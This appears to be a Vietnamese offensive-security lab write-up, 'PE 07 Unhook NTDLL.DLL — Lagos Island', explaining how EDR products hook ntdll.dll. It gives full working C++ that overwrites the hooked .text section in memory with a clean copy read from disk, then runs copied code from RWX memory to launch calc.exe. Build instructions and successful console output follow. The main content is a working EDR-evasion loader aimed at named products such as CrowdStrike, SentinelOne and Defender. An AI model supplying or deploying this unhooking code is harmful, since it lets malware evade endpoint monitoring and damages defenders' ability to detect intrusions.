
---

# 📝 [PE 07] Unhook NTDLL.DLL — Lagos Island

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Unhook NTDLL.DLL — Lagos Island** đại diện cho một giải thuật bẻ gãy bẫy giám sát bộ nhớ ảo nâng cao (Anti-Hooking / EDR Dynamic Evasion) tại phân hệ phân phối tầng thấp của Windows Subsystem.

Hầu hết các giải pháp Endpoint Detection and Response (EDR) và Antivirus thế hệ mới (như CrowdStrike, Falcon, SentinelOne, Microsoft Defender for Endpoint) đều thiết lập cơ chế giám sát hành vi động bằng kỹ thuật **User-mode Inline Hooking**. Cơ chế này can thiệp và ghi đè 5 byte đầu tiên của các hàm Native API tối cao lọt lòng thư viện `ntdll.dll` thành lệnh nhảy vô điều kiện `JMP <EDR_Memory_Module>`. Khi tiến trình Loader phát lệnh gọi các hàm cấp phát, thay đổi thuộc tính hoặc can thiệp RAM, dòng chảy CPU bị bẻ hướng cưỡng bức về phía EDR Engine để phân tích chỉ dấu hành vi.

Dự án PE 07 hóa giải toàn diện ma trận trinh sát này bằng kỹ nghệ **Nạp phản chiếu mô-đun sạch từ đĩa thô (Reflective Disk Mapping Evasion)**. Loader chủ động mở trực tiếp tệp tin hệ thống `ntdll.dll` nguyên bản từ đĩa cứng, giải phẫu cấu trúc cấu hình PE để trích xuất phân đoạn mã máy thực thi **`.text`** phẳng sạch, sau đó thực hiện giải thuật giẫm đạp ngược (Reverse Overwriting) nhằm đè nát các bẫy Hook, hoàn trả sự phẳng sạch nguyên bản kịch trần cho hệ thống.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa bộ lọc Inline Hooking**: Triệt tiêu hoàn toàn khả năng can thiệp dòng chảy CPU của các giải pháp phòng thủ tại không gian người dùng (Ring 3 User-mode).
* **Giải phẫu cấu trúc Section Table**: Làm chủ thuật toán định vị tọa độ Relative Virtual Address (RVA) và kích thước phân đoạn thực thi của các thư viện liên kết động.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Thư viện `ntdll.dll` đóng vai trò là cầu nối cầu hàng không tối cao giữa User-mode (Ring 3) và Kernel-mode (Ring 0). Mọi hàm Win32 API bọc ngoài (như `VirtualAllocEx`, `WriteProcessMemory`) thực chất chỉ là các hàm Wrapper bọc đầu; mã nguồn bên trong của Microsoft bắt buộc phải chuyển đổi tham số và gọi xuống các Native API tương ứng mang tiền tố `Nt/Zw` nằm lọt lòng `ntdll.dll` trước khi phát lệnh nạp số hiệu dịch vụ (Syscall Number) vào thanh ghi CPU.

Quy trình toán học giải phẫu và ghi đè triệt tiêu ma trận Hook của Lab PE 07 diễn ra qua 4 giai đoạn ngầm tại bộ nhớ ảo:

```
[Nạp tệp ntdll.dll thô vào bộ đệm Vector động]
       └──> [Giải phẫu song song cấu trúc PE Header: Bản RAM vs Bản Đĩa]
                 └──> [VirtualProtect: Mở khóa phân vùng .text trên RAM sang quyền RWX]
                           └──> [RtlCopyMemory: Ghi đè mã sạch, giải thoát tháp API]

```

1. **Đối chiếu bản đồ cấu trúc PE**: Loader sử dụng hàm `GetModuleHandleA` để trích xuất Base Address đang hoạt động của mô-đun `ntdll.dll` trên bộ nhớ ảo (nơi đã bị EDR ghi đè mã máy gài bẫy Hook). Đồng thời, ứng dụng sử dụng luồng đọc nhị phân hệ thống để kéo toàn bộ tệp tin vật lý `C:\Windows\System32\ntdll.dll` sạch từ ổ đĩa vào một cấu trúc mảng byte cục bộ (`std::vector`).
2. **Tính toán tịnh tiến phân đoạn**: Giải thuật truy cập vào bảng danh sách phân đoạn (**Section Table**) dựa trên cấu trúc các bản ghi `IMAGE_SECTION_HEADER` của file đĩa thô nhằm săn tìm phân đoạn mang tên định danh **`.text`** (phân vùng chứa mã máy thực thi của toàn bộ Native API). Loader bốc tách hai thông số toán học cốt lõi: `VirtualAddress` (Địa chỉ tương đối RVA) và `Misc.VirtualSize` (Kích thước thực tế của vùng mã máy).
3. **Phá xích bảo vệ trang nhớ hệ thống**: Do phân đoạn `.text` của một thư viện Image khi nạp lên bộ nhớ ảo mặc định mang cờ bảo vệ thuộc tính nghiêm ngặt `PAGE_EXECUTE_READ` (RX), Loader buộc phải phát lệnh `VirtualProtect` lật ngược thuộc tính của phân vùng này sang cờ **`PAGE_EXECUTE_READWRITE` (RWX)** để tạm thời mở khóa quyền Ghi (`W`).
4. **Giẫm đạp hoàn trả bản đồ sạch (Stomping Remap)**: Loader kích hoạt hàm sao chép bộ nhớ phẳng tuyến tính (`RtlCopyMemory`) để bốc toàn bộ khối mã máy `.text` nguyên thủy, chưa bị vấy bẩn từ bộ đệm đĩa thô, ghi đè bẹp lên phân đoạn `.text` bị nhiễm Hook trên RAM. Hành vi này xóa sổ hoàn toàn các byte lệnh `JMP` ăn cắp dòng chảy CPU của EDR, hoàn trả nguyên vẹn cấu trúc Stub mã máy `mov r10, rcx; mov eax, SyscallNumber; syscall; ret` xịn của Microsoft. Loader lật lại cờ `RX` ban đầu để xóa sạch dấu vết can thiệp.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <iostream>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí gánh luồng chạy nội bộ trên nền tảng phẳng sạch
DWORD WINAPI LaunchCalculatorUnhooked(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Hàm gỡ bẫy giám sát Unhook ntdll sử dụng cơ chế đọc file thô an toàn, bẻ gãy rào cản SEC_IMAGE
BOOL UnhookNtdllRaw() {
    PCSTR ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    HMODULE hNtdllLocal = GetModuleHandleA("ntdll.dll");
    if (!hNtdllLocal) return FALSE;

    // 1. Mở tệp tin ntdll.dll nguyên bản dạng đọc tệp thô phẳng sạch
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return FALSE; }

    // 2. Sử dụng File Mapping tiêu chuẩn hoàn toàn không dùng cờ SEC_IMAGE để bảo an
    HANDLE hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hFileMapping) { CloseHandle(hFile); return FALSE; }

    LPVOID pMappingBuffer = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMappingBuffer) { CloseHandle(hFileMapping); CloseHandle(hFile); return FALSE; }

    // 3. Giải phẫu PE Headers tường minh kiến trúc x64 bảo đảm tính toán toán học chính xác
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pMappingBuffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)pMappingBuffer + dosHeader->e_lfanew);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));

        // Săn lùng phân vùng mã máy thực thi hệ thống (.text Segment)
        if (strcmp((const char*)sectionHeader->Name, ".text") == 0) {

            // Toạ độ vùng nhớ bị Hook inside tiến trình hiện tại
            PVOID pLocalTextSection = (PVOID)((ULONG_PTR)hNtdllLocal + sectionHeader->VirtualAddress);

            // ĐỘT PHÁ TOÁN HỌC x64: Xác định vị trí byte sạch dựa trên PointerToRawData của file thô thay vì VirtualAddress
            PVOID pCleanTextSection = (PVOID)((ULONG_PTR)pMappingBuffer + sectionHeader->PointerToRawData);
            SIZE_T sectionSize = sectionHeader->Misc.VirtualSize;

            // 4. Lật quyền trang nhớ ntdll đang chạy sang RWX để chuẩn bị ghi đè dữ liệu sạch
            DWORD oldProtect = 0;
            BOOL isProtected = VirtualProtect(pLocalTextSection, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            if (isProtected) {
                // 5. Ghi đè toàn bộ byte nguyên bản sạch đè bẹp bẫy giám sát ngầm inside lòng ntdll
                RtlCopyMemory(pLocalTextSection, pCleanTextSection, sectionSize);

                // Khôi phục lại trạng thái bảo vệ bộ nhớ ảo ban đầu để xóa sạch dấu vết can thiệp
                VirtualProtect(pLocalTextSection, sectionSize, oldProtect, &oldProtect);
            }
            break;
        }
    }

    // Thu hồi tài nguyên bộ đệm Mapping cục bộ phẳng sạch
    UnmapViewOfFile(pMappingBuffer);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
    return TRUE;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 07: NTDLL UNHOOK LAGOS ISLAND (CALC.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::cout << "[*] Dang khoi dong quy trinh Unhook dung file tho an toan..." << std::endl;
    if (!UnhookNtdllRaw()) {
        std::cerr << "[-] Unhooking NTDLL Failed!" << std::endl;
        std::cout << "[*] Nhan Enter de dong..." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] KHAI XUAN THANH CONG: Ntdll.dll da phang sach nguyen ban 100%!" << std::endl;

    // Quy trình áp dụng cấp phát động thích ứng vừa vặn (Zero Static Buffers)
    SIZE_T functionSize = 500;

    // 1. Cấp phát vùng nhớ thực thi cục bộ
    LPVOID localCodeBuffer = VirtualAlloc(NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!localCodeBuffer) {
        std::cerr << "[-] VirtualAlloc cap phat bo nho ma may that bai!" << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX thiet lap tai: 0x" << std::hex << localCodeBuffer << std::endl;

    // 2. Cấp phát vùng nhớ chứa tham số dữ liệu tuyệt đối mang quyền RW
    PTHREAD_DATA pLocalData = (PTHREAD_DATA)VirtualAlloc(NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pLocalData) {
        VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }

    // 3. Khởi tạo con trỏ tuyệt đối WinExec bẻ gãy hoàn toàn rào cản Import Table
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");

    // 4. Sao chép thân hàm vào RAM thực thi cục bộ một cách hợp pháp
    RtlCopyMemory(localCodeBuffer, (LPVOID)LaunchCalculatorUnhooked, functionSize);
    std::cout << "[+] Sao chep logic ham vao RAM hoan tat." << std::endl;

    std::cout << "[*] Dang khoi tao luong Thread thuc thi chuc nang..." << std::endl;

    // 5. Khai hỏa luồng nội bộ thực thi chức năng mở máy tính trên một nền tảng ntdll đã phẳng sạch
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)localCodeBuffer, pLocalData, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateThread failed!" << std::endl;
        VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
        VirtualFree(pLocalData, 0, MEM_RELEASE);
        std::cin.get();
        return EXIT_FAILURE;
    }

    // Cấu hình cờ chờ đợi INFINITE gánh luồng xử lý dứt điểm phẳng sạch
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "[+] Luong Thread chuc nang da hoan thanh chu ky song." << std::endl;

    // 6. Dọn dẹp bộ nhớ triệt để chống rò rỉ tài nguyên hệ thống (Memory Leak)
    CloseHandle(hThread);
    VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
    VirtualFree(pLocalData, 0, MEM_RELEASE);
    std::cout << "[+] Quy trinh giai phong RAM hoan tat." << std::endl;

    std::cout << "\n[+] PE 07: NTDLL Unhooked & Code Executed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de ket thuc chuong trinh..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm file thực thi `.exe` vận hành mượt mà, độc lập, không bị phụ thuộc vào các gói phân phối liên kết động khi mang sang chạy trên môi trường máy ảo VM sạch hoặc môi trường cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình dự án ở chính xác chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
2. Di chuyển tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục thông số `Runtime Library`, thiết lập cấu hình sang định dạng cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống lọt lòng file nhị phân.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin sạch bóng lỗi chuỗi.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi hỏa file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi cuộc đại phẫu bẻ gãy bẫy giám sát:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE07_Reflective_DLL_Loading_Lagos_Island\x64\Release> C:\Users\Admin\source\repos\Task6\PE07_Reflective_DLL_Loading_Lagos_Island\x64\Release\PE07_Unhook_Lagos_Island.exe
====================================================
[*] PE 07: NTDLL UNHOOK LAGOS ISLAND (CALC.EXE)
====================================================
[*] Dang khoi dong quy trinh Unhook dung file tho an toan...
[+] KHAI XUAN THANH CONG: Ntdll.dll da phang sach nguyen ban 100%!
[+] Vung nho Code RWX thiet lap tai: 0x0000019656690000
[+] Sao chep logic ham vao RAM hoan tat.
[*] Dang khoi tao luong Thread thuc thi chuc nang...
[+] Luong Thread chuc nang da hoan thanh chu ky song.
[+] Quy trinh giai phong RAM hoan tat.

[+] PE 07: NTDLL Unhooked & Code Executed Successfully!
[*] Nhan phim Enter de ket thuc chuong trinh...

```

### Demo:
<img width="1920" height="600" alt="devenv_R6k0rr98K7" src="https://github.com/user-attachments/assets/3fd349b6-e425-4421-835b-e9b645bb5efd" />


---
